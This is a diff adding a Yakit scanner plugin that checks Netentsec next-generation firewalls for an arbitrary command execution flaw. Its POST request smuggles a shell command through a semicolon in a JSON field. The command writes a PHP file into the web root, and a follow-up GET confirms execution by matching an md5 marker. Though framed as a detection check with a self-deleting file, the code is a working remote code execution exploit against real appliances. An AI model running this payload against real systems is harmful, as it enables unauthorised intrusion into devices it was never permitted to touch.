@@ -1,0 +1,65 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+handleCheck = func(target,port){
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+
+    PacketPost = `POST /directdata/direct/router HTTP/1.1
+Host: {{params(target)}}
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 4
+
+{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '<?php echo md5(testpoc);unlink(__FILE__);?>' >/var/www/html/testpoc.php"]}],"type":"rpc","tid":17}
+`
+
+    PacketGet = `GET /testpoc.php HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+
+`
+
+    prsp,preq,_ = poc.HTTP(PacketPost, 
+    poc.params({"target":addr}),
+    poc.https(isTls),
+    poc.redirectTimes(0),
+    )
+
+    grsp,greq,_ = poc.HTTP(PacketGet, 
+    poc.params({"target":addr}),
+    poc.https(isTls),
+    poc.redirectTimes(0),
+    )
+
+    drsp, derr = str.ParseBytesToHTTPResponse(grsp)
+    header, body = str.SplitHTTPHeadersAndBodyFromPacket(grsp)
+
+    if drsp.StatusCode == 200 && str.MatchAllOfSubString(body, `f47c10c5b6057f617f95f12940869972`) {
+        yakit.Info("%v found 网康下一代防火墙_任意命令执行漏洞", addr)
+        risk.NewRisk(
+            addr,risk.title("netentsec-ngfw-rce"),
+            risk.severity("high"),
+            risk.titleVerbose("网康下一代防火墙_任意命令执行漏洞"),
+            risk.type("RCE[网康下一代防火墙]"),
+            risk.payload(`{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '<?php echo md5(testpoc);unlink(__FILE__);?>' >/var/www/html/testpoc.php"]}],"type":"rpc","tid":17}`),
+        )
+    }
+
+    return
+}
+
+handle = func(result /* *fp.MatchResult */) {
+    // handle match result
+    if !result.IsOpen(){
+        return
+    }
+    if len(result.Fingerprint.HttpFlows)>0{
+        handleCheck(result.Target,result.Port)
+    }
+    
+}
